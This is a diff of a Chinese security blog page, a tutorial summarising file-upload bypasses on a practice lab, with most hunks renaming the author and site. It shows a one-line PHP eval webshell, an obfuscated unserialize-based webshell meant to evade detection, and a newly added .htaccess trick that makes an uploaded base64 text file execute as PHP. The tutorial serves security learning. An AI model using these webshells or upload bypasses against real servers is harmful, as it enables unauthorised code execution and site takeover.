@@ -15,14 +15,14 @@
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="lewiserii">
+  <meta name="author" content="dr0n">
   <meta name="keywords" content="">
   
     <meta name="description" content="前言部分靶场用的是国光师傅的文件上传靶场项目 JavaScript绕过从最简单的js开始首先我们要判断是否为js前端验证F12查看代码，已经很明显了 js绕过的方法较多，常见的有抓包改后缀，禁用js或是直接修改代码我比较喜欢用chrome的禁用js访问chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript?search&#x3D;java添">
 <meta property="og:type" content="article">
 <meta property="og:title" content="关于文件上传的一点总结">
 <meta property="og:url" content="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93.html">
-<meta property="og:site_name" content="lewiserii&#39;s blog">
+<meta property="og:site_name" content="网络安全知识分享">
 <meta property="og:description" content="前言部分靶场用的是国光师傅的文件上传靶场项目 JavaScript绕过从最简单的js开始首先我们要判断是否为js前端验证F12查看代码，已经很明显了 js绕过的方法较多，常见的有抓包改后缀，禁用js或是直接修改代码我比较喜欢用chrome的禁用js访问chrome:&#x2F;&#x2F;settings&#x2F;content&#x2F;javascript?search&#x3D;java添">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj1.jpg">
@@ -46,8 +46,8 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/sum_up.png">
 <meta property="article:published_time" content="2021-07-01T06:00:00.000Z">
-<meta property="article:modified_time" content="2023-10-14T11:19:04.334Z">
-<meta property="article:author" content="lewiserii">
+<meta property="article:modified_time" content="2023-12-10T12:32:31.252Z">
+<meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary_large_image">
@@ -55,7 +55,7 @@
   
   
   
-  <title>关于文件上传的一点总结 - lewiserii&#39;s blog</title>
+  <title>关于文件上传的一点总结 - 网络安全知识分享</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -104,7 +104,7 @@
   <script  src="/js/color-schema.js" ></script>
 
   
-<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="lewiserii's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="网络安全知识分享" type="application/atom+xml">
 </head>
 
 
@@ -118,7 +118,7 @@
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
-      <strong>lewiserii&#39;s blog</strong>
+      <strong>网络安全知识分享</strong>
     </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
@@ -241,7 +241,7 @@
     
       <span class="post-meta mr-2">
         <i class="iconfont icon-author" aria-hidden="true"></i>
-        lewiserii
+        dr0n
       </span>
     
     
@@ -270,7 +270,7 @@
         
         
         
-          123 分钟
+          125 分钟
         
       </span>
     
@@ -390,7 +390,11 @@
 <p>或者使用短标签</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure>
 
+<p>再或者可以上传<code>.htaccess</code>文件来修改配置项</p>
+<p>例如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .txt<br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span><br></code></pre></td></tr></table></figure>
 
+<p>然后上传base64编码的txt文件即可</p>
 <p>第二种情况：检测危险函数等敏感内容<br>可以使用免杀马等</p>
 <p>例如</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>])) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HandShip</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$male</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$allin</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$allin</span>(<span class="hljs-variable language_">$this</span>-&gt;male);<br>     &#125;<br>  &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])==<span class="hljs-string">&#x27;ce61649168c4550c2f7acab92354dc6e&#x27;</span>)&#123;<br><br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>]);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -515,7 +519,7 @@
       
         <div class="license-meta-item">
           <div>作者</div>
-          <div>lewiserii</div>
+          <div>dr0n</div>
         </div>
       
       
